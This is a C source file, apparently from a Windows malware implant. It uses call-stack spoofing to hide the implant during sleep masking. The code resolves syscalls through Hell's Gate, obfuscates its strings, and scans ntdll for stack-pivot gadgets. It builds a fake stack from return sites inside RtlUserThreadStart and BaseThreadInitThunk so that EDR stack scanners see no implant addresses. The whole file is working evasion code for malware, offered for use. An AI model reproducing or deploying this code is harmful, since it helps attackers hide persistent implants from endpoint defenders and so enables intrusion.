/*
 * callstack.c — Multi-level call-stack synthesis for sleeping thread inspection.
 *
 * Goal: when the implant calls NtWaitForSingleObject (during sleep masking),
 * the visible call stack shows:
 *
 *   [rsp+0x00]  cleanup gadget   — ntdll .text (add rsp,0x20; ret)
 *   [rsp+0x08]  g_btt            — kernel32!BaseThreadInitThunk+N
 *   [rsp+0x10]  g_rtl            — ntdll!RtlUserThreadStart+K
 *   [rsp+0x18]  (above thread root — most scanners stop here)
 *
 * No stack address points into the implant's private .text region.
 *
 * The technique (implemented in SpoofedNtWait in syscall_stub.asm):
 *   1. pop real_ret off [rsp] into r11
 *   2. sub rsp, 0x30   — allocate fake frame slots
 *   3. fill [rsp+0..18] with gadget addrs; write r11 to [rsp+0x28]
 *   4. indirect syscall for NtWaitForSingleObject
 *   5. syscall's "ret" pops [rsp+0] = cleanup gadget → add rsp,0x20; ret
 *      → pivot lands at [rsp+0x28] = real_ret with RSP = P+8 ✓
 *
 * InitCallstackGadgets() must be called once after HellsGateInit().
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>

/* Gadget globals — defined in syscall_stub.asm, extern'd from implant.h */

/* ── Helpers ─────────────────────────────────────────────────────────────── */

/* Scan funcBase for the first direct CALL (E8) and return the address
 * immediately after it — this is a valid "return site" inside the function. */
static PVOID FindAfterFirstCall(const BYTE *funcBase, DWORD maxBytes) {
    if (!funcBase) return NULL;
    for (DWORD i = 0; i + 4 < maxBytes; i++) {
        if (funcBase[i] == 0xE8) {   /* CALL rel32 */
            return (PVOID)(funcBase + i + 5);
        }
    }
    return NULL;
}

/* Scan a DLL's .text for: 48 83 C4 20 C3  (add rsp, 0x20; ret).
 * This gadget is used as the stack pivot: after the syscall's "ret" pops it,
 * the pivot restores RSP and returns to the real caller. */
static PVOID FindAddRsp20Ret(PVOID dllBase) {
    if (!dllBase) return NULL;
    BYTE *base = (BYTE*)dllBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) != 0) continue;
        BYTE  *p   = base + sec[i].VirtualAddress;
        DWORD  len = sec[i].Misc.VirtualSize;

        /* Primary search: add rsp, 0x20; ret */
        for (DWORD j = 0; j + 4 < len; j++) {
            if (p[j]==0x48 && p[j+1]==0x83 && p[j+2]==0xC4 &&
                p[j+3]==0x20 && p[j+4]==0xC3)
                return p + j;
        }
        /* Fallback: add rsp, 0x28; ret — adjust real_ret slot by +8 */
        for (DWORD j = 0; j + 4 < len; j++) {
            if (p[j]==0x48 && p[j+1]==0x83 && p[j+2]==0xC4 &&
                p[j+3]==0x28 && p[j+4]==0xC3)
                return p + j;
        }
    }
    return NULL;
}

/* Find a named export in a loaded DLL via its export table. */
static PVOID FindExportInDll(PVOID dllBase, const char *name) {
    if (!dllBase) return NULL;
    BYTE *base = (BYTE*)dllBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD expRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return NULL;
    NT_EXPORT_DIR *exp = (NT_EXPORT_DIR*)(base + expRVA);
    DWORD *funcs = (DWORD*)(base + exp->AddressOfFunctions);
    DWORD *names = (DWORD*)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD *)(base + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (strcmp((const char*)(base + names[i]), name) == 0)
            return base + funcs[ords[i]];
    }
    return NULL;
}

/* ── Public ──────────────────────────────────────────────────────────────── */

void InitCallstackGadgets(PVOID ntdllBase) {
    if (!ntdllBase) return;

    /* SSN for NtWaitForSingleObject (used by SpoofedNtWait in ASM) */
    DWORD ssn = HellsGateSSN(OBFSTR("NtWaitForSingleObject"));
    if (ssn != 0xFFFFFFFF) g_wait_ssn = ssn;

    /* RtlUserThreadStart — ntdll, find first-call return site */
    PVOID rtl = FindExportInDll(ntdllBase, OBFSTR("RtlUserThreadStart"));
    if (rtl) {
        PVOID after = FindAfterFirstCall((const BYTE*)rtl, 256);
        if (after) g_rtl = after;
    }

    /* BaseThreadInitThunk — kernel32, find first-call return site */
    HMODULE k32 = GetModuleHandleA(OBFSTR("kernel32.dll"));
    if (k32) {
        PVOID btt = FindExportInDll((PVOID)k32, OBFSTR("BaseThreadInitThunk"));
        if (btt) {
            PVOID after = FindAfterFirstCall((const BYTE*)btt, 256);
            if (after) g_btt = after;
        }
    }

    /* Pivot gadget: add rsp, 0x20; ret — in ntdll .text */
    PVOID piv = FindAddRsp20Ret(ntdllBase);
    if (piv) g_pivot = piv;
}
